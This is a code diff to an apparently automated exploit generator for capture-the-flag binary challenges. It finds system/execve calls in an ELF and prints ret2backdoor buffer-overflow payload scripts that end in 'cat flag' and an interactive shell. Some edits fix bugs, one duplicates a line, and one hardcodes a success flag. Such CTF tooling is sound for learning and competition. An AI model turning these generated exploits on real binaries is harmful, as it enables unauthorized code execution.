@@ -369,7 +369,7 @@ def solve_read(elf, addr, file_name, file_os):
                     file_name,
                     file_os,
                     Stack_migration_address,
-                    auto_success,
+                    True,
                     remote)
             else:
                 auto_success = False
@@ -420,23 +420,25 @@ def solve_read_overflow(
         # strs_addr是执行内容，直接用机器码距离特征加相对地址计算解决
         overturn_Call_list = dict(
             list(zip(list(Call_list.values()), list(Call_list.keys()))))
+        overturn_Call_list = dict(
+            list(zip(list(Call_list.values()), list(Call_list.keys()))))
         for function in list(overturn_Call_list.keys()):
             if function == 'system':
                 system = True
                 system_be_called.append(
-                    Hierarchical_list[overturn_Call_list[function]])
+                    overturn_Hierarchical_list[overturn_Call_list[function]])
                 strs_addr = u64(elf.read(overturn_Call_list[function] - 7, 7)[
                                 3:].ljust(8, b'\x00')) + (overturn_Call_list[function])
-                strs = elf.read(strs_addr, 0x10).split('\x00')
+                strs = elf.read(strs_addr, 0x10).split(b'\x00')
             elif function == 'execve':
                 system = True
                 system_be_called.append(
-                    Hierarchical_list[overturn_Call_list[function]])
+                    overturn_Hierarchical_list[overturn_Call_list[function]])
         # ret2backdoor exp
         if system:
             for i in range(len(system_be_called)):
                 print(("[+]Found system(execve) be called by function:" +
-                       hex(system_be_called[i]) +
+                       hex(system_be_called[i][0]) +
                        " and system(xx) is " +
                        str(strs[0])))
                 if i == 0:
@@ -461,7 +463,7 @@ def solve_read_overflow(
                                     print("r.recv(timeout=1)")
                                     print("r.sendline(" + str(i) + ")")
                             print(("payload=" + "b'a'*" + hex(rsi + 8) + "+p64(" +
-                                  hex(ret) + ")" + "+p64(" + hex(system_be_called[i]) + ")"))
+                                  hex(ret) + ")" + "+p64(" + hex(system_be_called[i][0]) + ")"))
                             print("r.send(payload)")
                             print("r.sendline('cat flag')")
                             print("r.interactive()")
@@ -492,7 +494,7 @@ def solve_read_overflow(
                                    hex(ret) +
                                    ")" +
                                    "+p64(" +
-                                   hex(system_be_called[i]) +
+                                   hex(system_be_called[i][0]) +
                                    ")"))
                             print("r.send(payload)")
                             print("r.sendline('cat flag')")
